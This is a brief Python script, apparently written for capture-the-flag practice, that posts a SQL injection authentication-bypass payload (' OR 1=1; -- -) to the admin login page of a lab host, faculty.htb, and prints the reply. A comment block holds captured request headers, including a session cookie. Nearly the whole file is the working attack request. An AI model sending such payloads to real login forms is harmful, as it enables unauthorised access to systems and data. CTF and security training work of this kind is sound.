#!/usr/bin/python
# GOALS:
'''
	- multiple sqli auth bypass techniques
	- encoding options
	- url parameter parsing ???
	- ?


Description:
	A tool to quickly test basic sql based login bypasses for quick ctf recon checks



Concepts Demonstrated:
	web requests, SQL queries, SQL injections, auth bypass, insecure code review.





'''




import requests

url = 'http://faculty.htb/admin/login.php?'
payload = {'username':'\' OR 1=1; -- -','password':'test'}
proxy = {'http':'http://127.0.0.1:8080'}

r = requests.post(url,data=payload)
print("request sent")

'''
comma serparated header values


Host: faculty.htb,
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0,
Accept: */*,
Accept-Language: en-US,en;q=0.5,
Accept-Encoding: gzip, deflate,
Content-Type: application/x-www-form-urlencoded; charset=UTF-8,
X-Requested-With: XMLHttpRequest,
Content-Length: 27,
Origin: http://faculty.htb,
Connection: close,
Referer: http://faculty.htb/admin/login.php,
Cookie: PHPSESSID=0b516nccvdbgrthm95hdt50vm7




'''

print(r.text)
